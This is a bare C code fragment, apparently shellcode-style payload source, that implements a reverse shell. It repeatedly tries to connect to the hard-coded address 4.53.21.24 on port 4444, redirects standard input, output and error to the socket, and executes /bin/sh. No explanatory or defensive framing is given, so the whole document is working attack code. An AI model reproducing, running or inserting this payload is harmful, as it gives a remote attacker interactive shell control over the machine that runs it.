int sockfd = 0;
struct sockaddr_in serv_addr;
time_t start, now;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(4444);
serv_addr.sin_addr.s_addr = inet_addr("4.53.21.24");

start = time(NULL);
while (1) {
if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
    now = time(NULL);
    if (difftime(now, start) > 30) {
    return;
    }
    close(sockfd);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
} else {
    break;
}
}

dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);

char* args[] = {"/bin/sh", NULL};
execve(args[0], &args[0], NULL);